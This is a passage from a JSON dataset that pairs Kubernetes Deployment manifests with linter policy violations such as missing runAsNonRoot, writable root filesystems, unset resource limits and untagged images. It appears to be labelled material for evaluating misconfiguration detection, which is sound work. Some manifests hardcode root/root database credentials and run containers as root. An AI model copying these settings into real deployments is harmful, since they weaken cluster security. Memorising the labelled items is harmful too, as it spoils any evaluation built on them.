    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"openmcp-analytic-engine\" does not have a read-only root file system"
  },
  {
    "id": "01277",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"openmcp-analytic-engine\" is not set to runAsNonRoot"
  },
  {
    "id": "01278",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"openmcp-analytic-engine\" has cpu request 0"
  },
  {
    "id": "01279",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"openmcp-analytic-engine\" has memory limit 0"
  },
  {
    "id": "01280",
    "manifest_path": "data/manifests/the_stack_sample/sample_0372.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    control-plane: controller-manager\n  name: special-resource-controller-manager\n  namespace: openshift-special-resource-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - args:\n        - --secure-listen-address=0.0.0.0:8443\n        - --upstream=http://127.0.0.1:8080/\n        - --logtostderr=true\n        - --v=10\n        - --tls-cert-file=/etc/secrets/tls.crt\n        - --tls-private-key-file=/etc/secrets/tls.key\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256\n        image: registry.redhat.io/openshift4/ose-kube-rbac-proxy\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          limits:\n            cpu: 500m\n            memory: 128Mi\n          requests:\n            cpu: 250m\n            memory: 64Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/secrets\n          name: special-resource-operator-tls\n      - args:\n        - --metrics-addr=127.0.0.1:8080\n        - --enable-leader-election\n        command:\n        - /manager\n        env:\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: SSL_CERT_DIR\n          value: /etc/pki/tls/certs\n        image: quay.io/openshift-psap/special-resource-operator:chart-as-asset\n        imagePullPolicy: Always\n        name: manager\n        resources:\n          limits:\n            cpu: 300m\n            memory: 500Mi\n          requests:\n            cpu: 300m\n            memory: 500Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /cache\n          name: cache-volume\n      securityContext:\n        runAsGroup: 499\n        runAsNonRoot: true\n        runAsUser: 499\n      volumes:\n      - name: special-resource-operator-tls\n        secret:\n          secretName: special-resource-operator-tls\n      - emptyDir: {}\n        name: cache-volume\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kube-rbac-proxy\" is using an invalid container image, \"registry.redhat.io/openshift4/ose-kube-rbac-proxy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01281",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "01282",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "01283",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "01284",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "01285",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "01286",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "01287",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"frontend-check\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01288",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"main\" is using an invalid container image, \"loadgenerator\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01289",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend-check\" does not have a read-only root file system"
  },
  {
    "id": "01290",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "01291",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "01292",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"frontend-check\" has cpu request 0"
  },
  {
    "id": "01293",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"frontend-check\" has memory limit 0"
  },
  {
    "id": "01294",
    "manifest_path": "data/manifests/the_stack_sample/sample_0376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.3.1\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 4680350d90b15cd48f3a8504bff0c968752ad64ad3080e746113158aa5eb44b3\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: pa.gigante\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.1\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: 